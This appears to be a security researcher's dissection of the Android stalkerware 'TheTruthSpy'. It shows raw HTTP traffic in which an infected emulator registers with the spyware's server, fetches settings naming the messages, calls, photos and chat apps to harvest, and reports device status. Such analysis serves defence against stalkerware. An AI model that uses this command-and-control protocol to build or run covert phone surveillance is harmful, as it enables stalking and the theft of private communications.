## Dissection of an infection, 'TheTruthSpy'.

This will be an indepth look at what happens immediately after installation of 'TheTruthSpy', both on the Android phone and over the network.

```
GET /protocols/check_device_registered.aspx?deviceid=d4bc-803e-25f0-8913 HTTP/1.1
Host: protocol-a810.thetruthspy.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 17 Jan 2019 15:34:36 GMT

0
The device does not exist in the system.
```

```
GET /protocols/device_register.aspx?username=emillio.esneider@plutocow.com&password=p4ssw0rd&deviceid=d4bc-803e-25f0-8913 HTTP/1.1
Host: protocol-a810.thetruthspy.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 17 Jan 2019 16:03:40 GMT

1
```

```
POST /protocols/getsetting.aspx HTTP/1.1
Content-Length: 69
Content-Type: application/x-www-form-urlencoded
Host: protocol-a810.thetruthspy.com
Connection: Keep-Alive

deviceid=d4bc-803e-25f0-8913&clienttime=2019-01-17+08%3A03%3A50&os=ADHTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 17 Jan 2019 16:03:52 GMT

<protocol-version:20150201-0900>,<*#3>,<*#6>,<*#8>,<*#11>,<*#13>,<*#15>,<*#21>,<*#24>,<*#27>,<*#30><0><50>,
<*#31><15>,<*#32><30>,<*#52>,<*#54>,<*#56>,<*#58>,<*#60>,<*#62>,<*#64>,<*#66>,<*#68>,<*#70>,<*#72>,<*#74>,
<*#352>,<*#78>,<*#82>,<*#84>,<*#86>,<*#88>,<*#94><#2013*>,<*#95><>,<*#96><>,<*#97><>,<*#102>,<*#111>
<WiFi/CellularData>,<*#76>,<*#372>,<*#376>,<*#382>,<*#386>,<*#392>,<*#394>,<*#396>,<*#398>,<*#1001>,<*#33>
<sms=2018-11-17 23:03:52;call=2018-11-17 23:03:52;contact=2018-11-17 23:03:52;app=2018-11-17 23:03:52;
photo=2018-11-17 23:03:52;url=2018-11-17 23:03:52;notes=2018-11-17 23:03:52;whatsapp=2018-11-17 23:03:52;
yahoo=2018-11-17 23:03:52;viber=2018-11-17 23:03:52;facebook=2018-11-17 23:03:52;skype=2018-11-17 23:03:52;
tango=2018-11-17 23:03:52;wechat=2018-11-17 23:03:52;ola=2018-11-17 23:03:52;hangouts=2018-11-17 23:03:52;
bbm=2018-11-17 23:03:52;line=2018-11-17 23:03:52;kik=2018-11-17 23:03:52;twitter=2018-11-17 23:03:52;
instagram=2018-11-17 23:03:52;snapchat=2018-11-17 23:03:52>,delivery-logs-to-email=emillio.esneider@plutocow.com
```

```
POST /protocols/setsetting.aspx HTTP/1.1
Content-Length: 455
Content-Type: application/x-www-form-urlencoded
Host: protocol-a810.thetruthspy.com
Connection: Keep-Alive

deviceid=d4bc-803e-25f0-8913&clienttime=2019-01-17+08%3A03%3A58&t=1&country=us&params=%3C*%2311%3E%2C%3C*%2313%3E%2C%3C*%2368%3E%2C%3C*%2358%3E%2C%3C*%2376%3E%2C%3C*%2315%3E%2C%3C*%2321%3E%2C%3C*%2352%3E%2C%3C*%2356%3E%2C%3C*%2360%3E%2C%3C*%2331%3E%3C15%3E%2C%3C*%2331%3E%3C30%3E%2C%3C*%2394%3E%3C%232013*%3E%2C%3C*%2395%3E%3C%3E%2C%3C*%2397%3E%3C%3E%2C%3C*%2398%3E%3CFull+Android+on+Emulator%3E%2C%3C*%2399%3E%3C357242043237511%3E&os=Android+4.1.1%238.10HTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 17 Jan 2019 16:04:01 GMT

1
```

```
POST /protocols/set_device_status.aspx HTTP/1.1
Content-Length: 203
Content-Type: application/x-www-form-urlencoded
Host: protocol-a810.thetruthspy.com
Connection: Keep-Alive

deviceid=d4bc-803e-25f0-8913&status=+start+working+on+2019-01-17+08%3A04%3A04&is_rooted_or_jailbroken=0&gps_option_turned=1&battery=100&wifi_enabled=0&network_available=1&datetime=2019-01-17+08%3A04%3A04HTTP/1.1 200 OK
Cache-Control: private
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNetMvc-Version: 5.2
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 17 Jan 2019 16:04:03 GMT

1
```
